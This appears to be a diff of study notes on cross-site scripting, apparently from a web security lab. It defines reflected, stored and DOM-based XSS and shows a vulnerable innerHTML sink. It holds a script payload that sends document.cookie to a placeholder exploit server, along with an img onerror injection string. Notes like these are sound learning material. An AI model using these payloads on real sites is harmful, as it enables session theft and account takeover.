@@ -1,1 +1,21 @@
 <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+Proof:
+alert()
+print()
+
+Reflected cross-site scripting:
+Malicious script comes from the current HTTP request
+
+Stored cross-site scripting:
+Malicious script comes from the website's database
+
+DOM-based cross-site scripting:
+The vulnerability exists in client-side code rather than server-side code
+var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+You searched for: <img src=1 onerror='/* Bad stuff here... */'>
+
+To find DOM-based vulnerabilities in non-URL-based input (such as document.cookie) or non-HTML-based sinks (like setTimeout), there is no substitute for reviewing JavaScript code
+
